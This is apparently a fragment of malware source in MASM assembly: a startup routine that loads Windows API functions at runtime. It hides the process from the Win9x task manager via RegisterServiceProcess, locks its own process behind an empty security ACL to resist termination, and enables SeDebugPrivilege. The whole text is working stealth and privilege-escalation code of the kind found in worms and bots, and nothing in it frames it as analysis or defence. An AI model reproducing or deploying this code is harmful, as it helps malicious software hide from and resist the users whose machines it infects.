 .data
                szAdvApi                db      "advapi32.dll",0
                                        db      "AdjustTokenPrivileges", 0
                                        db      "InitializeAcl",0
                                        db      "LookupPrivilegeValueA",0
                                        db      "OpenProcessToken",0
                                        db      "SetSecurityInfo",0,0

                szKernel32              db      "kernel32.dll",0
                                        db      "RegisterServiceProcess",0,0    ;  							RegisterServiceProcess(GetCurrentProcessID,1);. ..

                dwAdjustTokenPrivileges dd      0
                dwInitializeAcl         dd      0
                dwLookupPrivilegeValue  dd      0
                dwOpenProcessToken      dd      0
                dwSetSecurityInfo       dd      0
                dwRegServiceProcess     dd      0

                szNetworkParams         db      "iphlpapi.dll",0,"GetNetworkParams",0,0
		dwGetNetworkParams      dd      0
.code
ProcessStartup proc uses esi edi
        LOCAL   hTokenPrivat: DWORD
        LOCAL   SeDebugNameValue: QWORD
        LOCAL   tkpnew: TOKEN_PRIVILEGES
        LOCAL   len: DWORD
        LOCAL   myACL: ACL

        ; Load libraries
        invoke  PayLoadDll, offset szAdvApi, offset dwAdjustTokenPrivileges
        invoke  PayLoadDll, offset szNetworkParams, offset dwGetNetworkParams
        invoke  PayLoadDll, offset szKernel32, offset dwRegServiceProcess

        ; Win95/98 only

        ; Hide in taskmanager
        .IF     dwRegServiceProcess
                push    1
                invoke  GetCurrentProcessId
                push    eax
                call    dwRegServiceProcess
        .ENDIF

        .IF     !dwAdjustTokenPrivileges || !dwInitializeAcl || !dwLookupPrivilegeValue || !dwOpenProcessToken || !dwSetSecurityInfo
                ret
        .ENDIF

        ; WinNT/2k/XP only

        ; Set debug status
        invoke  ZeroMemory, addr myACL, sizeof ACL
        push    2
        push    sizeof ACL
        lea     eax, myACL
        push    eax
        call    dwInitializeAcl

        invoke  GetCurrentProcess
        push    eax
        xchg    eax, edx
        push    0
        lea     eax, myACL
        push    eax
        push    0
        push    0
        push    4
        push    6
        push    edx
        call    dwSetSecurityInfo

        ; Adjust debug privilege
        pop     edx
        lea     eax, hTokenPrivat
        push    eax
        push    TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY
        push    edx
        call    dwOpenProcessToken

        lea     eax, SeDebugNameValue
        push    eax
        push    offset szSeDebug
        push    NULL
        call    dwLookupPrivilegeValue

        lea     esi, SeDebugNameValue
        lea     edi, tkpnew.Privileges[0].Luid
        mov     ecx, 8
        rep movsb
        mov     tkpnew.PrivilegeCount, 1
        mov     tkpnew.Privileges[0].Attributes, SE_PRIVILEGE_ENABLED

        lea     eax, len
        push    eax
        lea     eax, tkpnew
        push    eax
        push    sizeof TOKEN_PRIVILEGES
        push    eax
        push    FALSE
        push    hTokenPrivat
        call    dwAdjustTokenPrivileges
        ret
ProcessStartup endp